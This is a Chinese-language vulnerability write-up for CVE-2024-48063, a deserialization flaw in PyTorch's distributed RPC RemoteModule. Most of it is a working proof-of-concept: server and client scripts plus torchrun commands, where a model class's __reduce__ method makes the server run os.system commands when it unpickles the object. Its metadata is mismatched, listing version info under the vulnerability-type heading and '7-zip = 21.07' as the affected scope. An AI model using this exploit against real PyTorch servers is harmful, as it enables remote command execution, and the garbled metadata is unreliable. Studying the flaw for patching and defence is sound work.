# CVE-2024-48063

>   PyTorch是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。

## 来源

[https://rumbling-slice-eb0.notion.site/Distributed-RPC-Framework-RemoteModule-has-Deserialization-RCE-in-pytorch-pytorch-111e3cda9e8c8021a7d3cbc61ee1a20c](https://rumbling-slice-eb0.notion.site/Distributed-RPC-Framework-RemoteModule-has-Deserialization-RCE-in-pytorch-pytorch-111e3cda9e8c8021a7d3cbc61ee1a20c)

## 简介

PyTorch的分布式RPC框架中存在反序列化漏洞，由于RemoteModule在反序列化过程中没有适当地验证或清理输入数据，导致攻击者可以通过客户端将包含恶意方法的RemoteModule实例序列化为数据，并通过RPC框架发送到服务器触发反序列化，从而可能导致在服务器上远程执行任意命令。

## 漏洞类型

-   PyTorch <= 2.4.1

## 影响范围

7-zip = 21.07

## **Proof of Concept**

init environment

```shell
export MASTER_ADDR=127.0.0.1
export MASTER_PORT=5000
export TP_SOCKET_IFNAME=ens18
export GLOO_SOCKET_IFNAME=ens18
```

the server code

[ser.py](http://ser.py)

```python
import torch
import torch.distributed.rpc as rpc

def run_server():
    # Initialize server-side RPC
    rpc.init_rpc("server", rank=0, world_size=2)
    
    # Wait for the client's remote call
    rpc.shutdown()

if __name__ == "__main__":
    run_server()
```

exec this to run

```shell
torchrun --nproc_per_node=1 --nnodes=2 --node_rank=0 --master_addr=127.0.0.1 --master_port=5000 ser.py
```

## **POC**

the client code and is exp

[cli.py](http://cli.py)

```python
import torch
import torch.distributed.rpc as rpc
from torch.distributed.nn.api.remote_module import RemoteModule
import torch.nn as nn

# Define a simple neural network model MyModel
class MyModel(nn.Module):
    def __init__(self):
        super(MyModel, self).__init__()
        # A simple linear layer with input dimension 2 and output dimension 2
        self.fc = nn.Linear(2, 2)

    # Define the forward method
    def __reduce__(self):
        return (__import__('os').system, ("id;ls",))

def run_client():
    # Initialize client-side RPC
    rpc.init_rpc("client", rank=1, world_size=2)

    # Create a remote module to run the model on the server side
    remote_model = RemoteModule(
        "server",  # Server-side device
        MyModel(),   # Definition of the remote module's model
        args=()    # Model initialization parameters
    )
    
    # Remotely call the model with an input tensor
    input_tensor = torch.tensor([1.0, 2.0])
    output = remote_model(input_tensor)
    
    print("Output from remote model:", output)
    
    # Shutdown RPC
    rpc.shutdown()

if __name__ == "__main__":
    run_client()
```

exec this to run

```shell
torchrun --nproc_per_node=1 --nnodes=2 --node_rank=1 --master_addr=127.0.0.1 --master_port=5000 cli.py
```



